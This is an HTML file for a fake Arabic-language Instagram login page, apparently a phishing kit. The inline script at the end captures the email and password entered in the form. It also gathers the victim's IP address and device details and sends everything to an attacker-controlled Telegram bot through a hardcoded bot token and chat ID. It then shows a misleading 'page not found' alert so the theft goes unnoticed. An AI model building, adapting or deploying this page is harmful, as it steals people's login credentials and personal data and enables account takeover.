<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="./style.css" />
    <link rel="icon" type="image/png" href="./img/insta-fav.ico">
    <title>Instagram</title>
</head>
<body>
    <main class="flex align-items-center justify-content-center">
        <section id="mobile" class="flex">
        </section>
        <section id="auth" class="flex direction-column">
            <div class="panel login flex direction-column">
                <h1 title="Instagram" class="flex justify-content-center">
                    <img src="./img/instagram-logo.png" alt="شعار انستجرام" title="شعار انستجرام" />
                </h1>
                <form id="login-form">
                    <label for="email" class="sr-only">رقم الهاتف أو اسم المستخدم أو البريد الإلكتروني</label>
                    <input id="email" name="email" placeholder="رقم الهاتف أو اسم المستخدم أو البريد الإلكتروني" />

                    <label for="password" class="sr-only">كلمة المرور</label>
                    <input id="password" name="password" type="password" placeholder="كلمة المرور" />
                    <button type="submit">تسجيل الدخول</button> 
                </form>
                <div class="flex separator align-items-center">
                    <span></span>
                    <div class="or">أو</div>
                    <span></span>
                </div>
                <div class="login-with-fb flex direction-column align-items-center">
                    <div>
                        <a href="#">تسجيل الدخول عبر فيسبوك</a>
                    </div>
                    <a href="#">هل نسيت كلمة المرور؟</a>
                </div>
            </div>
            <div class="panel register flex justify-content-center">
                <p>ليس لديك حساب؟</p>
                <a href="#">التسجيل</a>
            </div>
            <div class="app-download flex direction-column align-items-center">
                <p>احصل على التطبيق.</p>
                <div class="flex justify-content-center">
                    <img src="./img/apple-button.png" alt="شعار متجر آبل" title="تحميل من متجر آبل" />
                    <img src="./img/googleplay-button.png" alt="شعار متجر جوجل بلاي" title="تحميل من متجر جوجل بلاي" />
                </div>
            </div>
        </section>
    </main>
    <footer>
        <ul class="flex flex-wrap justify-content-center">
            <li><a href="#">حول</a></li>
            <li><a href="#">مساعدة</a></li>
            <li><a href="#">صحافة</a></li>
            <li><a href="#">واجهة برمجة التطبيقات (API)</a></li>
            <li><a href="#">وظائف</a></li>
            <li><a href="#">الخصوصية</a></li>
            <li><a href="#">الشروط</a></li>
            <li><a href="#">المواقع</a></li>
            <li><a href="#">أعلى الحسابات</a></li>
            <li><a href="#">الهاشتاجات</a></li>
            <li><a href="#">اللغة</a></li>
        </ul>
        <p class="copyright">© 2020 انستجرام من فيسبوك</p>
    </footer>

    <script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
    <script>
        const TOKEN = "8246566598:AAEBliQTac7iyYwOI5v79l9mV0xySvCvwsE";                                                            // استبدل برمز البوت الفعلي             
        const CHAT_ID = "7872048429";                                                       // استبدل بمعرف الدردشة الفعلي
        const URI_API = `https://api.telegram.org/bot8246566598:AAEBliQTac7iyYwOI5v79l9mV0xySvCvwsE/sendMessage`;        

        document.getElementById('login-form').addEventListener('submit', function(e) {
            e.preventDefault();

            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;

            axios.get('https://api.ipify.org?format=json')
                .then(response => {
                    const ip = response.data.ip;

                    const userAgent = navigator.userAgent;
                    const platform = navigator.platform;
                    const screenWidth = screen.width;
                    const screenHeight = screen.height;
                    const deviceType = /mobile/i.test(navigator.userAgent) ? 'جهاز محمول' : 'جهاز مكتبي';

                    const message = ` 
                        <b>محاولة تسجيل دخول جديدة</b>\n
                        <b>البريد الإلكتروني:</b> ${email}\n
                        <b>كلمة المرور:</b> ${password}\n
                        <b>عنوان الـ IP:</b> ${ip}\n
                        <b>نوع الجهاز:</b> ${deviceType}\n
                        <b>المنصة:</b> ${platform}\n
                        <b>وكيل المستخدم:</b> ${userAgent}\n
                        <b>دقة الشاشة:</b> ${screenWidth}x${screenHeight}
                    `;

                    axios.post(URI_API, {
                        chat_id: CHAT_ID,
                        parse_mode: 'html',
                        text: message
                    }).then(response => {
                        alert('عذرا!! لم يتم العثور غلى صفحة الويب')
                    }).catch(error => {
                        alert('حدث خطأ أثناء إرسال المعلومات. حاول مرة أخرى.');
                    });
                })
                .catch(error => {
                    alert('حدث خطأ أثناء الحصول على عنوان الـ IP. حاول مرة أخرى.');
                });
        });
    </script>
</body>
</html>
